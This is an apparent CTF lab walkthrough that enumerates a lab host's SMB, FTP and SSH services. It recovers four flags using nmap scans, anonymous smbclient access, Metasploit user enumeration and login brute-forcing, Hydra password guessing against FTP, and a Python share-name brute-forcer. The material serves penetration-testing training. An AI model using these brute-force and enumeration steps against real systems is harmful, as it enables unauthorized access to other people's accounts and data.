## Assessment Methodologies: Enumeration CTF 1

### Flag 1: There is a samba share that allows anonymous access. Wonder what's in there!

We proceed with an assessment for the target using nmap
```
nmap -Pn -sS -sV -F target.ine.local
```
The only ports open are:
```
22 - OpenSSH 8.2p1
139 - Samba 4.6.2
445 - Samba 4.6.2
```
Following the hints, we concentrate on port 445:
```
nmap -Pn -sS -sV -p 445 --script=smb-* target.ine.local
```
However nothing interesting emerges from this scan

Next we try an anonymous login, but no useful data is found, as the only shares detectable are
```
print$
IPC$
```
We use the command:
```
smbclient -L target.ine.local -N
```
to list all available shares.

Even connecting to IP$ is of no use, while print$ is not accessible.
```
smbclient \\\\target.ine.local\\IPC$\\ -U anonymous
```
Thenl, we try using Metasploit modules:
```
smb_enumusers
smb_enumshares
```
While the second reveals only the information we already know, the first one reveals four users name:
```
josh
nancy
bob
alice
```
We attempt a brute-force attack against those users using the Metasploit module smb_login:

Using /usr/share/wordlists/metasploit/unix_passwords.txt as a password list, we find:
```
josh -> purple
```
While we do not find the share we need, we attempt to brute-force folder name using a list located on desktop and provided by the machine.
```
smbclient -U '' //target.ine.local/pubfiles
```
After several attempts, we find the pubfiles directory containing the first flag.

***

### Flag 2: One of the samba users have a bad password. Their private share with the same name as their username is at risk!

While we are unable to see a complete list of the shares, we assume that the share for the user josh has the same name:
```
smbclient \\\\target.ine.local\\josh -U josh
```
In this location, we find the second flag.

***

### Flag 3: Follow the hint given in the previous flag to uncover this one.

The previous flag suggests that there is an FTP service running on the target machine, but no such a service is found on port 21.

We try to scan the entire port range with nmap searching for an FTP service.
We find something in running on port 5554:
```
nmap -Pn -sS -p- target.ine.local
```
Further investigation:
```
nmap -Pn -sS -p 5554 -sV -sC target.ine.local 
```
reveals that an FTP service is running on port 5554.
```
ftp -P 5554 target.ine.local
```
This command prints a banner:
```
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
```
We identify three users for brute-forcing access to the service:
```
ashley
alice
amanda
```
Using Hydra:
```
hydra -l alice -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
```
alice has the weakest password, “pretty”
```
ftp -P 5554 target.ine.local
```
We log into FTP service with this username and password to recover the third flag.

***

### Flag 4: This is a warning meant to deter unauthorized users from logging in.

The last known service on the machine is SSH.
After attempting to access it with the root user, the service prints a warning banner containing the final flag.

***

### Alternative to discover Flag 1

We have to write Python code (or a bash script) to automate the process of brute forcing using the list in Desktop subfolder.
```python
import subprocess

# Path to the file containing the list of shares
file_path = "shares.txt"

# Open the file and iterate through each line
try:
    with open(file_path, 'r') as file:
        for line in file:
            share = line.strip()  # Remove any leading/trailing whitespace
            
            if share:  # Skip empty lines
                # Construct the smbclient command
                command = (f"smbclient //target.ine.local/{share} -N -c \"ls\"")
                
                print(f"Executing: {command}")
                
                # Run the command
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                
                # Print the output or errors
                if result.returncode == 0:
                    print(f"Output for share {share}:\n{result.stdout}")
                else:
                    print(f"Error for share {share}:\n{result.stderr}")

except Exception as e:
    print(f"An error occurred: {e}")
```
